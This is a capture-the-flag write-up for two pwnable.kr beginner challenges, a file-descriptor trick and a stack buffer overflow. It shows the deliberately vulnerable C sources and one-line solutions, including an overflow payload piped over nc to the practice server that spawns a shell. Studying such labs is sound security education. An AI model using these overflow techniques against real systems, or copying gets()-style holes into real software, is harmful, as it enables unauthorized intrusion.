+++
title = "pwnable.kr - Toddler's Bottle"
date = 2020-04-27T12:59:37.396Z
updated = 2020-12-27
aliases = ["/posts/5ea6d739cea15a083827d57f-pwnablekr-toddlers-bottle"]
[taxonomies]
tags = ['pwnable.kr', 'binary-exploitation', 'buffer-overflow', 'pwntools']
categories = ["ctf-writeups"]
+++

# fd - 1pt
## Challenge
> Mommy! what is a file descriptor in Linux?
> 
> ssh fd@pwnable.kr -p2222 (pw:guest)

## Source Code

After ssh-ing into the server with the given details, we can view the source code of the challenge by running `cat fd.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;
}
```

<!-- more -->

## File Descriptors

On POSIX systems, there are three standard file descriptors:

* Standard Input (stdin) which has a fd of `0`
* Standard Output (stdout) which has a fd of `1`
* Standard Error (stderr) which has a fd of `2`

## Solution

The program subtracts 0x1234 from a file descriptor we provide and then reads from it. If the read string is `LETMEWIN\n`, it gives us the flag. If we get the program to read from `stdin`, we can just type `LETMEWIN` into the terminal, and we will get the flag:

```bash
echo LETMEWIN | ./fd $(python -c "print 0x1234 + 0")
```

# bof - 5pt
## Challenge

> Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?
> 
> Download : http://pwnable.kr/bin/bof
> 
> Download : http://pwnable.kr/bin/bof.c
> 
> Running at : nc pwnable.kr 9000

## Source Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

## Background


### Stack Frames
The stack stores local variables and function parameters and is used to pass parameters with certain calling conventions. This diagram (taken from [Wikipedia](https://en.wikipedia.org/wiki/Call_stack)) shows an example stack layout:

{{ svg(path="5ea6d67bcea15a083827d578.svg") }}


### gets

The function `gets` is insecure and allows for buffer overflows when used because it only stops at new lines or EOF. The manpage for gets (`man gets`) says this:

> Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the  end  of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.

## Solution

We need to overwrite the `key` parameter passed to `func`. To get there we will need to overwrite 36 bytes (`char overflowme[32]`, and the return address (4 bytes in 32-bit programs)). However, additional values are pushed onto the stack to save the previous location of the stack. Therefore, we have to place `0xcafebabe` at 52 bytes into the stack:

```bash
(python -c "print('A'*52 + '\xbe\xba\xfe\xca')" && cat - ) | nc pwnable.kr 9000
```

Note that `0xcafebabe` is encoded into a little-endian format, and `cat -` is used to allow us to communicate with the opened shell.
